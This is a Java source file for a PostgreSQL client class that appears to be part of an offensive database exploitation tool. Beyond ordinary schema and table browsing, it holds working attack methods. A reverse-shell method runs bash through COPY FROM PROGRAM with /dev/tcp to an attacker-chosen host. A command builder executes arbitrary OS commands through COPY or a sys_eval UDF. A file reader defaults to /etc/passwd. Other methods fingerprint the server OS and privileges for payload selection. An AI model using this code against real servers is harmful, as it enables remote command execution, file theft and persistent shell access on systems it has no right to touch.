package database;

import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class psql {

    private String host;
    private String port;
    private String database;
    private String username;
    private String password;

    private Connection conn = null;

    public psql(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = port;
        this.database = database;
        this.username = username;
        this.password = password;
    }

    /**
     * 返回一个可复用的 Connection。若当前连接为 null 或已关闭则新建连接。
     */
    private Connection getConnection() throws SQLException {
        if (conn == null || conn.isClosed()) {
            String url = "jdbc:postgresql://" + host + ":" + port + "/" + database;
            conn = DriverManager.getConnection(url, username, password);
        }
        return conn;
    }

    /**
     * 显式关闭复用连接（如果存在），并将其置为 null。
     */
    public void close() {
        if (conn != null) {
            try {
                if (!conn.isClosed()) conn.close();
            } catch (SQLException e) {
                System.err.println("[psql.close] Close connection error: " + e.getMessage());
            } finally {
                conn = null;
            }
        }
    }

    /**
     * 测试连接（不影响复用连接 conn）
     */
    public boolean testConnection() {
        String url = String.format("jdbc:postgresql://%s:%s/%s", this.host, this.port, this.database);
        try (Connection tmp = DriverManager.getConnection(url, this.username, this.password)) {
            return tmp != null && !tmp.isClosed();
        } catch (SQLException e) {
            e.printStackTrace();
            return false;
        }
    }

    public List<String> getDatabases() {
        List<String> dbList = new ArrayList<>();
        String url = String.format("jdbc:postgresql://%s:%s/%s", this.host, this.port, "postgres");

        try (Connection con = DriverManager.getConnection(url, this.username, this.password); Statement stmt = con.createStatement(); ResultSet rs = stmt.executeQuery("SELECT datname FROM pg_database WHERE datistemplate = false;")) {

            while (rs.next()) {
                dbList.add(rs.getString("datname"));
            }

        } catch (SQLException e) {
            System.out.println("[-] \uD83D\uDCA5获取数据库列表失败: " + e.getMessage());
        }

        return dbList;
    }

    public List<String> getSchemas() {
        List<String> schemas = new ArrayList<>();
        String sql = "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql); ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    schemas.add(rs.getString("schema_name"));
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return schemas;
    }

    public List<String> getTables(String schema) {
        List<String> tables = new ArrayList<>();
        String sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = ? ORDER BY table_name";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, schema);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) {
                        tables.add(rs.getString("table_name"));
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return tables;
    }

    public List<String> getColumnNames(String schema, String table) {
        List<String> columns = new ArrayList<>();
        String sql = "SELECT column_name FROM information_schema.columns WHERE table_schema = ? AND table_name = ? ORDER BY ordinal_position";
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql)) {
                ps.setString(1, schema);
                ps.setString(2, table);
                try (ResultSet rs = ps.executeQuery()) {
                    while (rs.next()) {
                        columns.add(rs.getString("column_name"));
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return columns;
    }

    public List<List<Object>> getTopRows(String schema, String table, int limit) {
        List<List<Object>> rows = new ArrayList<>();
        String sql = "SELECT * FROM " + schema + "." + table + " LIMIT " + limit;
        try {
            Connection c = getConnection();
            try (PreparedStatement ps = c.prepareStatement(sql); ResultSet rs = ps.executeQuery()) {
                ResultSetMetaData meta = rs.getMetaData();
                int colCount = meta.getColumnCount();
                while (rs.next()) {
                    List<Object> row = new ArrayList<>();
                    for (int i = 1; i <= colCount; i++) {
                        row.add(rs.getObject(i));
                    }
                    rows.add(row);
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return rows;
    }

    /**
     * 执行任意 SQL 语句（支持多行格式）
     * 注意：此方法不会关闭持久连接，请调用 close() 来释放连接。
     */
    public String executeSQL(String sql) throws SQLException {
        if (sql == null || sql.trim().isEmpty()) {
            return "[!] SQL语句不能为空！";
        }

        StringBuilder sb = new StringBuilder();
        String[] statements = sql.split(";\\s*(?:\\r?\\n)?");

        Connection c = getConnection();
        boolean originalAutoCommit = c.getAutoCommit();
        try {
            c.setAutoCommit(true);

            for (String stmtStr : statements) {
                stmtStr = stmtStr.trim();
                if (stmtStr.isEmpty()) continue;

                try (Statement stmt = c.createStatement()) {
                    String lower = stmtStr.toLowerCase();
                    int timeout = (lower.contains("copy") && lower.contains("program")) ? 5 : 15;
                    stmt.setQueryTimeout(timeout);

                    boolean hasResultSet = stmt.execute(stmtStr);
                    while (true) {
                        if (hasResultSet) {
                            try (ResultSet rs = stmt.getResultSet()) {
                                while (rs.next()) {
                                    Object val = rs.getObject(1); // 只取第一列
                                    if (val != null && !val.toString().isEmpty()) {
                                        if (sb.length() > 0) sb.append("\n");
                                        sb.append(val.toString());
                                    }
                                }
                            }
                        } else {
                            int updateCount = stmt.getUpdateCount();
                            if (updateCount == -1) {
                                break;
                            }
                        }
                        hasResultSet = stmt.getMoreResults();
                    }
                } catch (SQLTimeoutException te) {
                    return "[!] \uD83D\uDCA5SQL执行超时: " + te.getMessage() + "\n";
                } catch (SQLException e) {
                    return e.getMessage() + "\n";
                }
            }
        } finally {
            try {
                c.setAutoCommit(originalAutoCommit);
            } catch (SQLException ignore) {
            }
        }

        return sb.toString() + "\n";
    }

    /**
     * 获取数据库基本信息，返回格式化字符串
     */
    public String getDatabaseInfo() {
        StringBuilder sb = new StringBuilder();
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {

                try (ResultSet rs = stmt.executeQuery("SELECT version();")) {
                    if (rs.next()) {
                        sb.append("[+] Database Version: ").append(rs.getString(1)).append("\n");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SELECT current_user;")) {
                    if (rs.next()) {
                        sb.append("[+] Current User: ").append(rs.getString(1)).append("\n");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles WHERE rolname = current_user;")) {
                    if (rs.next()) {
                        sb.append("[+] Superuser: ").append(rs.getBoolean("rolsuper")).append("\n");
                        sb.append("[+] Can Create Role: ").append(rs.getBoolean("rolcreaterole")).append("\n");
                        sb.append("[+] Can Create DB: ").append(rs.getBoolean("rolcreatedb")).append("\n");
                        sb.append("[+] Can Login: ").append(rs.getBoolean("rolcanlogin")).append("\n");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SELECT current_database();")) {
                    if (rs.next()) {
                        sb.append("[+] Connected Database: ").append(rs.getString(1)).append("\n");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SHOW data_directory;")) {
                    if (rs.next()) {
                        sb.append("[+] Data directory: ").append(rs.getString(1)).append("\n");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SHOW config_file;")) {
                    if (rs.next()) {
                        sb.append("[+] Config file: ").append(rs.getString(1)).append("\n");
                    }
                }
            }
        } catch (SQLException e) {
            sb.append("[-] \uD83D\uDCA5获取数据库信息失败: ").append(e.getMessage()).append("\n");
        }

        return sb.toString();
    }

    public List<String> udf_init() {
        List<String> sb = new ArrayList<>();
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {

                try (ResultSet rs = stmt.executeQuery("SELECT substring(current_setting('server_version') FROM '^[0-9]+') AS major_version;")) {
                    if (rs.next()) {
                        sb.add(rs.getString(1));
                    } else {
                        sb.add("unknown");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SELECT CASE " + "WHEN version() ~* 'windows' OR version() ~* 'visual c\\+\\+' OR version() ~* 'vc' THEN 'windows' " + "WHEN version() ~* 'linux' OR version() ~* 'gnu' OR version() ~* 'freebsd' OR version() ~* 'solaris' OR version() ~* 'unix' THEN 'linux' " + "WHEN version() ~* 'darwin' OR version() ~* 'mac' THEN 'mac' " + "ELSE 'other' END AS os_type;")) {
                    if (rs.next()) {
                        sb.add(rs.getString(1));
                    } else {
                        sb.add("unknown");
                    }
                }

                try (ResultSet rs = stmt.executeQuery("SELECT CASE WHEN strpos(version(), '64-bit') > 0 THEN '64' WHEN strpos(version(), '32-bit') > 0 THEN '32' ELSE 'unknown' END AS architecture;")) {
                    if (rs.next()) {
                        sb.add(rs.getString(1));
                    } else {
                        sb.add("unknown");
                    }
                }

            }
        } catch (SQLException e) {
            System.out.println(e.getMessage());
        }
        return sb;
    }

    public boolean revershell(String host, int port) throws SQLException {
        try {
            Connection c = getConnection();
            try (Statement stmt = c.createStatement()) {
                String sql = "drop table if exists cmd_exec;create table cmd_exec(cmd_output text);" + "copy cmd_exec from program '/bin/bash -c \"/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1\"';";
                stmt.execute(sql);
                return true;
            }
        } catch (SQLException e) {
            System.out.println(e.getMessage());
            return false;
        }
    }

    /**
     * 生成执行系统命令的 SQL 语句
     *
     * @param cmd  要执行的系统命令
     * @param type SQL 类型（COPY 或 UDF）
     * @return 构造好的 SQL 语句
     */
    public static String exCmd(String cmd, String type) {

        if (cmd == null || cmd.isEmpty()) {
            cmd = "whoami";
        }

        cmd = cmd.replace("'", "''");

        String sqlTemplate = """
                DROP TABLE IF EXISTS cmd_exec;
                CREATE TABLE cmd_exec(cmd_output text);
                COPY cmd_exec FROM PROGRAM '%s' WITH ENCODING 'ISO-8859-1';
                SELECT * FROM cmd_exec;
                DROP TABLE IF EXISTS cmd_exec;
                """;

        String sqlTemplateAlt = """
                SELECT sys_eval('%s');
                """;

        if (type.equals("COPY")) {
            return String.format(sqlTemplate, cmd);
        } else if (type.equals("UDF")) {
            return String.format(sqlTemplateAlt, cmd);
        }
        return String.format(sqlTemplate, cmd);
    }

    /**
     * 读取文件内容的 SQL 语句
     *
     * @param path 文件路径
     * @param type 读取方式：PG_Read / COPY / LOAD_FILE
     * @return 构造好的 SQL
     */
    public static String readFiles(String path, String type) {
        if (path == null || path.isEmpty()) {
            path = "/etc/passwd";
        }

        path = path.replace("'", "''");

        return switch (type) {
            case "PG_Read" -> String.format("SELECT pg_read_file('%s');", path);
            case "COPY" -> String.format("""
                    DROP TABLE IF EXISTS file_content;
                    CREATE TABLE file_content (content text);
                    COPY file_content FROM '%s';
                    SELECT * FROM file_content;
                    DROP TABLE file_content;
                    """, path);
            default -> "无效的类型: " + type;
        };
    }
}
